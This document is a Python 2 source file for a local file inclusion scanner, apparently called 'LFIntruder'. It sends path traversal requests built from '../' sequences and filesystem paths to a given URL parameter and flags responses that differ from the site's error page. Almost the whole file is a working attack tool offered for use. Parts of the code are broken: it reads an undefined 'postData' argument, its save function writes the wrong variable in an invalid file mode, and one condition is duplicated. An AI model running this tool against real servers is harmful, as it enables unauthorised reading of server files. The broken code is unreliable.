from difflib import SequenceMatcher
import os, argparse, sys, random, requests

def Print(something):
    split = something.split("\n")
    if len(split) > 1:
        Print("")
        for each in split[1:]:
            print "    {}".format(each)

    else:
        print "[*] {}".format(something)

def generatePaths(Max = None):
    paths = []
    root = os.path.abspath(os.sep)
    for previous, dirs, files in os.walk(root):
        for dir in dirs:
            if len(paths) == Max:
                return paths
            paths.append(os.path.join(previous, dir))
    return paths

def generateFiles(Max = None):
    paths = []
    root = os.path.abspath(os.sep)
    for previous, dirs, files in os.walk(root):
        for each in files:
            if len(paths) == Max:
                return paths
            paths.append(os.path.join(previous, each))
    return paths

def combineWithFile(filename, pathList):
    newPaths = []
    for i in pathList:
        newPaths.append(os.path.join(i, filename))
    return newPaths

def savePaths(outfile, pathList):
    with open(outfile, "wa") as file:
        for i in paths:
            file.write(i+"\n")
        file.close()

def parse():
    parser = argparse.ArgumentParser()

    group = parser.add_mutually_exclusive_group()
    group.add_argument("--generate-dirs", dest="generate_dirs", action="store_true" , help="Generate directory paths. If not specified jump to LFI")
    group.add_argument("--generate-files", dest="generate_files", action="store_true" , help="Generate file paths. If not specified jump to LFI")
    group.add_argument("--generate-custom", dest="generate_custom", action="store_true" , help="Generate paths with custom file. If not specified jump to LFI")

    parser.add_argument("-w", "--wordlist", dest="wordlist", type=str, help="Wordlist to be used to test LFI")
    parser.add_argument("-o", "--out-file", dest="path_file", type=str, help="Write generated paths to file")
    parser.add_argument("-n", "--number", dest="path_number", default=500, type=int, help="Number of maximum paths to be generated")
    parser.add_argument("-s", "--string", dest="custom_string", type=str, help="Filename to be included in the paths")
    parser.add_argument("-u", "--url",  dest="url", type=str, help="URL to be tested")
    parser.add_argument("-p", "--param",  dest="param", type=str, help="Parameter to be tested")
    parser.add_argument("-l", "--levels",  dest="levels", type=int, help="Number of levels to go backwards (i.e --levels 2 means ../../tests)")

    args = parser.parse_args()
    return [parser, args]

def Banner():
    banner = """
##############################################################

     _     ______ _____      _                  _
    | |    |  ___|_   _|    | |                | |
    | |    | |_    | | _ __ | |_ _ __ _   _  __| | ___ _ __
    | |    |  _|   | || '_ \| __| '__| | | |/ _` |/ _ \ '__|
    | |____| |    _| || | | | |_| |  | |_| | (_| |  __/ |
    \_____/\_|    \___/_| |_|\__|_|   \__,_|\__,_|\___|_|


############################################### By Diego Bernal
                """
    print banner

def LFI_error_tester(url, postData, tests, tolerance):
    # ASSUME THAT URL IS IN THE FORM OF: http://host:port/index.php?value=filepath

    error = []
    validity = 0

    for i in xrange(len(tests)):
        if postData:
            content = requests.post(url+tests[i], data=postData).content.strip()
        else:
            content = requests.get(url+tests[i]).content.strip()
        error.append(content)

    best = []

    for i in error:
        validity = 0
        for j in error:
            if SequenceMatcher(None, i, j).ratio() > tolerance:
                validity += SequenceMatcher(None, i, j).ratio()

        best.append((i, validity/len(tests)))

    min_score = min([n[1] for n in best])
    error = [i for i in best if i[1] == min_score][0][0]
    return (error, validity)

def LFI_exploiter(url, postData, error, paths, validity, levels=1):

    matches = 0

    try:
        for x in range(0,levels):
            urli = url + "../"*x
            Print("Trying level {}...".format(str(x+1)))
            for i in paths:
                url_use = (urli+i).replace("..//", "../")

                if postData:
                    content = requests.post(url_use, postData).content.strip()
                else:
                    content = requests.get(url_use).content.strip()

                # IMPROVE WAY OF CHECKING WHETHER ERROR OR FILE

                if SequenceMatcher(None, content, error).ratio() < validity and abs(len(error) - len(content)) > 50:
                    Print("==> Match found with {}".format(url_use))
                    matches += 1

    except KeyboardInterrupt:
        print "\r[*] Aborting, {} matches found.".format(matches)
        return 1

    Print("Finished, {} matches found.".format(matches))

def urlparse(url, value):

    base = url.split("?")[0]
    params = url.split("?")[-1].split("&")

    for i in params:
        if i.split("=")[0] == value:
            params.append(params.pop(params.index(i)))

    if params[-1].split("=")[0] != value:
        return -1

    return base + "?" + "=".join("&".join(params).split("=")[:-1])+"="

def getRubbish(attempts = 10):

    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    files = []
    ext = [".php", ".html", ".txt"]

    for i in xrange(attempts):
        files.append(''.join(random.choice(alphabet) for i in range(10)))

    return [x+y for x in files for y in ext]

def show_options(args):

    Print("Configuration:")
    for a,b in args.iteritems():
        if b != None and b != False:
            print("    [*] {:<16}: {}".format(a, b))
    print


if __name__ == "__main__":

    parser, args = parse()

    if len(sys.argv) == 1:
        Banner()
        parser.print_usage()
        print
        sys.exit(0)

    else:
        Banner()

    paths = []
    maxPaths = args.path_number
    url = args.url
    file_str = args.custom_string
    out = args.path_file
    params = args.param
    levels = args.levels or 1
    wordlist = args.wordlist
    postData = args.postData or 0

    # figure out a way of showing all the configurations at the beginning

    show_options(vars(args))

    if wordlist != None:

        Print("Parsing paths from file...")
        for i in open(wordlist, "r").read().split("\n"):
            if i != "":
                paths.append(i)

    elif args.generate_dirs or args.generate_dirs or args.generate_custom:

        if args.generate_dirs:

            Print("Generating directory paths from filesystem...")
            paths = generatePaths(maxPaths)
            #Print("Number of directory paths generated: {}.".format(maxPaths))

        elif args.generate_files:

            Print("Generating file paths from filesystem...")
            paths = generateFiles(maxPaths)
            #Print("Number of file paths generated: {}.".format(maxPaths))

        else:

            if file_str == None:
                Print("--generate_custom flag needs a filename to craft the paths. Include it with -s STRING or --string STRING")
                sys.exit(1)

            Print("Generating custom file paths from filesystem with: {}...".format(file_str))
            paths = generatePaths(maxPaths)
            paths = combineWithFile(file_str, paths)
            #Print("Number of file paths generated: {}.".format(maxPaths))

    else:

        Print("Generating file paths from filesystem...")

        paths = generateFiles(maxPaths)

        #Print("Number of file paths generated: {}.".format(maxPaths))

    if url:

        tolerance = 0.75

        if params:
            Print("Parameter to be tested: {}".format(params))
            url = urlparse(url, params) # rearranges url so that fuzzed parameter is last & empty
            if url == -1:
                Print("--param supplied hasn't been found on the URL.")
                sys.exit(1)

        else:
            Print("--url needs a parameter to test. Include it with -p or --param")
            sys.exit(1)

        #Print("Getting error message from: {}.".format(url))
        Print("Getting error message...")

        tests = getRubbish()
        error, validity = LFI_error_tester(url, postData, tests, tolerance)

        Print("Error message detected, lenght = {}.".format(len(error)))
        Print("Starting exploitation ({} level(s))...".format(levels))


        LFI_exploiter(url, postData, error, paths, validity, levels)

    if out:

        Print("Saving generated paths to {}...".format(out))
        savePaths(out, paths)
